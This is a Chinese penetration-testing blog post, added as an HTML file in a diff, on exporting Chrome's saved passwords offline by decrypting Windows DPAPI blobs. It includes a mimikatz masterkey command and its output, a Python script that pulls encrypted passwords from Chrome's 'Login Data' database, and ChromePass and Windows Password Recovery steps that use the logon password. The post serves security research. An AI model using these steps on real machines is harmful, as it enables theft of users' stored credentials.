@@ -1,0 +1,275 @@
+<article class="post">
+  <h1>渗透技巧——离线导出Chrome浏览器中保存的密码</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《渗透技巧——导出Chrome浏览器中保存的密码》</a>介绍了导出Chrome浏览器密码的原理和利用方法，文末留下一个问题： <strong>如果只获得了用户的ntlm hash，能否导出Chrome浏览器保存的明文密码呢？</strong></p>
+
+<p>该部分的参考资料较少，而想要解答这个问题，需要了解加解密的原理，所以本文尝试对该部分内容做介绍，得出最终结论</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>DPAPI简介及相关概念</li>
+  <li>DPAPI加解密流程</li>
+  <li>离线导出原理</li>
+  <li>离线导出方法</li>
+  <li>得出最终结论</li>
+</ul>
+
+<h2 id="0x02-dpapi简介">0x02 DPAPI简介</h2>
+<hr>
+
+<p>本节内容参考自如下链接，加入个人理解：</p>
+
+<p>https://msdn.microsoft.com/en-us/library/ms995355.aspx</p>
+
+<p>https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28</p>
+
+<p>DPAPI全称<code class="language-plaintext highlighter-rouge">Data Protection Application Programming Interface</code></p>
+
+<p>作为Windows系统的一个数据保护接口被广泛使用</p>
+
+<p>主要用于保护加密的数据，常见的应用如：</p>
+
+<ul>
+  <li>EFS文件加密</li>
+  <li>存储无线连接密码</li>
+  <li>Windows Credential Manager</li>
+  <li>Internet Explorer</li>
+  <li>Outlook</li>
+  <li>Skype</li>
+  <li>Windows CardSpace</li>
+  <li>Windows Vault</li>
+  <li>Google Chrome</li>
+</ul>
+
+<p>使用简单，加密使用函数CryptProtectData，解密使用函数CryptUnprotectData即可，系统在后台自动完成其他复杂的加解密操作</p>
+
+<p>CryptProtectData的说明可参考：</p>
+
+<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa380261(v=vs.85).aspx</p>
+
+<p>CryptUnprotectData的说明可参考：</p>
+
+<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa380882(v=vs.85).aspx</p>
+
+<h3 id="专有名词">专有名词</h3>
+
+<h4 id="dpapi-blob">DPAPI blob：</h4>
+
+<p>一段密文，可使用Master Key对其解密</p>
+
+<p>结构如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/2-1.png" alt="Alt text"></p>
+
+<p>该图引用自https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28</p>
+
+<h4 id="master-key">Master Key：</h4>
+
+<p>64字节，用于解密DPAPI blob</p>
+
+<p>通过用户登录密码、SID和16字节随机数加密后保存在Master Key file中</p>
+
+<h4 id="master-key-file">Master Key file：</h4>
+
+<p>二进制文件，可使用用户登录密码对其解密，获得Master Key</p>
+
+<p>包含以下五个部分：</p>
+
+<ul>
+  <li>Header and system information</li>
+  <li>User’s Master Key</li>
+  <li>Local backup encryption key</li>
+  <li>Unique CREDHIST file identifier</li>
+  <li>Domain Master Key backup</li>
+</ul>
+
+<p>位于固定位置： <code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Protect\%SID%</code></p>
+
+<p>例如：</p>
+
+<p><code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Roaming\Microsoft\Protect\S-1-5-21-3453529135-4164765056-1075703908-1001</code></p>
+
+<p>包含文件<code class="language-plaintext highlighter-rouge">329c4147-0011-4ad6-829d-e32dcbd1bbd7</code>(系统文件，隐藏属性)</p>
+
+<p>无法直接查看</p>
+
+<p>可通过mimikatz对其解析，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe log "dpapi::masterkey /in:"329c4147-0011-4ad6-829d-e32dcbd1bbd7"
+</code></pre></div></div>
+
+<p>输出如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz(commandline) # dpapi::masterkey /in:329c4147-0011-4ad6-829d-e32dcbd1bbd7
+**MASTERKEYS**
+  dwVersion          : 00000002 - 2
+  szGuid             : {329c4147-0011-4ad6-829d-e32dcbd1bbd7}
+  dwFlags            : 00000005 - 5
+  dwMasterKeyLen     : 000000b0 - 176
+  dwBackupKeyLen     : 00000090 - 144
+  dwCredHistLen      : 00000014 - 20
+  dwDomainKeyLen     : 00000000 - 0
+[masterkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : 9917a47f1949226e4e8c5b8a3aaf4808
+    rounds           : 00000ce4 - 3300
+    algHash          : 0000800e - 32782 (CALG_SHA_512)
+    algCrypt         : 00006610 - 26128 (CALG_AES_256)
+    pbKey            : cf2634535384431da063fd9a240ab575d13dc1daee8ea545d5c9a0628fa5cc63cf825b3b24642b3d7fe98a3703c1e7cdc7e49132a017e3e45fe34f8512fdb8b224e5c30a754683ff6e098a94a1ee396c026a6022323aff6903b3cdad1185a719accadb924f80482dcf426996fb3f662323d7c9e885504f39baa080d63eaddd2621171b3d780cef9c47d9a0b79a4afc20
+
+[backupkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : 57fb6f4228e9ca7d686c7f174f1691b0
+    rounds           : 00000ce4 - 3300
+    algHash          : 0000800e - 32782 (CALG_SHA_512)
+    algCrypt         : 00006610 - 26128 (CALG_AES_256)
+    pbKey            : 1ae34b8395375465871a999c0d04365cc5089cad4bea139344ecb8f9cf0da1abe5d7b096e9594506a0d8c772469b1f81118d608823e2be33020a8a86bb6d190d61865d270e299dfec9aca011531313dd2a2cd6dc4a53adc77b17a410d15ac4c6b11b3450d1c9739e869f67a8278d60ee
+
+[credhist]
+  **CREDHIST INFO**
+    dwVersion        : 00000003 - 3
+    guid             : {58680bc7-055e-4728-ab96-c34d64c565f2}
+</code></pre></div></div>
+
+<h2 id="0x03-dpapi解密思路">0x03 DPAPI解密思路</h2>
+<hr>
+
+<h3 id="1使用用户登录密码解密master-key-file获得master-key">1、使用用户登录密码解密Master Key file，获得Master Key</h3>
+
+<p>固定位置： <code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Protect\%SID%</code>下往往有多个Master Key file</p>
+
+<p>这是为了安全起见，系统每隔90天会自动生成一个新的Master Key(旧的不会删除)</p>
+
+<p><code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Protect\%SID%</code>下存在一个固定文件<code class="language-plaintext highlighter-rouge">Preferred</code>，包含最后一个Master Key file的名称和创建时间，文件结构如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _tagPreferredMasterKey
+{
+  GUID guidMasterKey;
+  FILETIME ftCreated;
+} PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;
+</code></pre></div></div>
+
+<h3 id="2使用master-key解密dpapi-blob获得明文">2、使用Master Key解密DPAPI blob，获得明文</h3>
+
+<h2 id="0x04-离线导出chrome浏览器中保存的密码">0x04 离线导出Chrome浏览器中保存的密码</h2>
+<hr>
+
+<h3 id="1获得dpapi-blob">1、获得DPAPI blob</h3>
+
+<p>DPAPI blob位于SQLite数据库文件Login Data的password段，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/3-1.png" alt="Alt text"></p>
+
+<p>使用python脚本对其读取并保存到文件中，代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import getenv
+import sqlite3
+import binascii
+conn = sqlite3.connect("Login Data")
+cursor = conn.cursor()
+cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+for result in cursor.fetchall():
+    print (binascii.b2a_hex(result[2]))
+    f = open('test.txt', 'wb')
+    f.write(result[2])
+    f.close()
+</code></pre></div></div>
+
+<h3 id="2解密master-key获得明文">2、解密Master Key获得明文</h3>
+
+<p>使用工具Windows Password Recovery，下载地址：</p>
+
+<p>https://www.passcape.com/index.php?section=downloads&amp;category=28</p>
+
+<p>选择<code class="language-plaintext highlighter-rouge">Utils</code> -&gt; <code class="language-plaintext highlighter-rouge">DPAPI Decoder and Analyser</code> -&gt; <code class="language-plaintext highlighter-rouge">Decrypt DPAPI data blob</code></p>
+
+<p>设置DPAPI blob file指向保存DPAPI blob的文件test.txt，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/3-2.png" alt="Alt text"></p>
+
+<p>设置Master Key file指向待破解的Master Key file，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/3-3.png" alt="Alt text"></p>
+
+<p>接下来输入用户登录密码</p>
+
+<p>获得明文，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/3-4.png" alt="Alt text"></p>
+
+<p>成功解密</p>
+
+<p>使用ChromePass对结果进行验证</p>
+
+<p>ChromePass下载地址：</p>
+
+<p>http://www.nirsoft.net/utils/chromepass.html</p>
+
+<p>参数说明：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/external &lt;User Profile Path&gt; &lt;Last Log-On Password&gt;
+</code></pre></div></div>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ChromePass.exe /external c:\1\2\3\ test123 
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/3-5.png" alt="Alt text"></p>
+
+<h2 id="0x05-最终结论">0x05 最终结论</h2>
+<hr>
+
+<h3 id="1无法自动定位master-key-file">1、无法自动定位Master Key file</h3>
+
+<p>如果用户sid文件夹下包含多个Master Key file，使用Windows Password Recovery尝试解密时，需要逐个测试，也可通过读取文件Preferred的前16字节获得对应的Master Key file</p>
+
+<p>使用ChromePass不存在这个问题，填入文件上级目录的路径即可</p>
+
+<h3 id="2无法使用用户登录密码的ntlm-hash解密master-key">2、无法使用用户登录密码的NTLM hash解密Master Key</h3>
+
+<p>目前版本的DPAPI在设计上考虑到了这个隐患，使用SHA1算法(NTLM hash使用MD4加密)</p>
+
+<p>所以说，无法使用用户登录密码的NTLM hash解密Master Key</p>
+
+<h3 id="3dpapi很安全符合密码安全性的要求">3、DPAPI很安全，符合密码安全性的要求</h3>
+
+<p>以上测试基于已获得了目标系统的访问权限，也就是说目标系统已经变得不安全</p>
+
+<p>对于一个未获得访问权限的Windows系统，目前使用DPAPI不会造成密码被破解的问题</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr>
+
+<p>本文通过分析DPAPI加解密流程，得出结论： 使用用户的ntlm hash，无法导出Chrome浏览器保存的明文密码</p>
+
+<h2 id="0x07-补充">0x07 补充</h2>
+<hr>
+
+<p>离线导出Chrome浏览器中保存的密码还可以通过lsass进程提取出Master Key进行解密，不需要获得用户的明文密码，详情可参考<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码》</a></p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on January 26, 2018
+  </div>
+
+  
+</article>
